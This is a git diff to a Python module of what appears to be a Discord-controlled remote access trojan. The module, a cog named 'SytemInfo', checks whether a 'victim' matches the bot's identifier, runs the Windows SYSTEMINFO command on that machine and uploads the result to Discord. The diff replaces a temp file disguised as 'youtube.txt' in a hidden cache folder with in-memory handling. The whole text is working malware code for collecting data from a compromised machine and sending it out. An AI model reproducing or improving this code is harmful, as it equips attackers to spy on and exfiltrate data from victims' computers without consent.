@@ -1,8 +1,9 @@
 import disnake as discord
 from disnake.ext import commands
 from datetime import datetime
+from io import BytesIO
 
-import os, requests, time, subprocess
+import os, requests, subprocess
 nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 
 class SytemInfo(commands.Cog):
@@ -20,19 +21,23 @@ class SytemInfo(commands.Cog):
         if str(victim) == str(self.bot.identifier):
             await ctx.response.defer()
             
-            subprocess.run(
-                f'SYSTEMINFO > "{nr_working}\\youtube.txt"',
-                shell=True,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                stdin=subprocess.PIPE
+            output = BytesIO(
+                bytes(
+                    os.popen("SYSTEMINFO").read(),
+                    'utf-8'
+                )
             )
+
             await ctx.followup.send(
-                embed=self.bot.genEmbed( "System Information:", datetime.now() ),
-                file=discord.File(nr_working + "\\youtube.txt", filename="systeminfo.txt"), 
+                embed=self.bot.genEmbed(
+                    "System Information:", 
+                    datetime.now()
+                ),
+                file=discord.File(
+                    output, 
+                    filename="systeminfo.txt"
+                ), 
             )
-            time.sleep(2)
-            os.remove(nr_working + "\\youtube.txt")
 
 def setup(bot: commands.Bot):
     bot.add_cog(SytemInfo(bot))
